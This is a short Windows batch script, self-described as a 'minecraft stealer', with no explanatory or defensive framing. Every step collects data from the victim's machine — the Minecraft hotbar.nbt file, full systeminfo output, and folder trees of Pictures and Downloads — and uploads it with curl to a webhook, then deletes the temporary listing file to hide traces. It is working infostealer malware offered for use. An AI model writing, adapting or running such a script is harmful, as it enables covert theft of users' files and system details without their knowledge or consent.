@echooff
set webhook="stealerwebhook"

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"minecraft stealer by hai1723: \"}" %webhook%
curl -i -H 'Expect: application/json' -F file=@%appdata%\.minecraft\hotbar.nbt %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"system info \"}" %webhook%
systeminfo > "%appdata%\systeminfo.txt"
curl -i -H 'Expect: application/json' -F file=@%appdata%\systeminfo.txt %webhook%
echo Pictures>dir.txt
tree /a /f "%userprofile%\Pictures" >>dir.txt
echo Downloads >>dir.txt
tree /a /f "%userprofile%\Downloads" >>dir.txt
curl -i -H 'Expect: application/json' -F file=@%cd%\dir.txt %webhook%
del /q "dir.txt"